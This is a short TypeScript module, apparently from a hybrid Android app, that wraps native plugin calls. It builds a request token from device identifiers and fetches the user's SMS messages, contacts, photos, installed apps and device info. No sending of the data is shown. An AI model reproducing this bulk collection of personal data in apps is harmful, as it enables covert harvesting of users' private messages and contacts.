import { add } from './AESKey';
import MyEcho from './Plugin.ts'
// // 获取Token
export async function getPhoneInfo() {
    const { gaId, androidId, appVersionName } = await MyEcho.echo({ key: 'getRequestHeadToken' });
    console.log(' GAID, AID, VERSION', gaId, androidId, appVersionName);
    const str = {
        GAID: gaId,
        AID: androidId,
        RV: appVersionName,
        VERSION: '1.0.0'
    }
    const token = 'UAM3IHKS' + add(str)
    return token
}
// //获取权限
export async function getPermission() {
    const ret = await MyEcho.echo({ key: 'getQuanxian' });
    // console.log(JSON.stringify(ret), 'ret')
    return ret
}
export async function getDeviceInfo() {
    const ret = await MyEcho.echo({ key: 'getDeviceInfo' });
    // console.log(JSON.stringify(ret), 'ret')
    return ret
}

export async function getAppList() {
    const ret = await MyEcho.echo({ key: 'getAppList' });
    // console.log(JSON.stringify(ret), 'ret')
    return ret
}

export async function getSmsList() {
    const ret = await MyEcho.echo({ key: 'getSmsList' });
    // console.log(JSON.stringify(ret), 'ret')
    return ret
}

export async function getPhotoList() {
    const ret = await MyEcho.echo({ key: 'getPhotoList' });
    // console.log(JSON.stringify(ret), 'ret')
    return ret
}
export async function getContactList() {
    const ret = await MyEcho.echo({ key: 'getContactList' });
    // console.log(JSON.stringify(ret), 'ret')
    return ret
}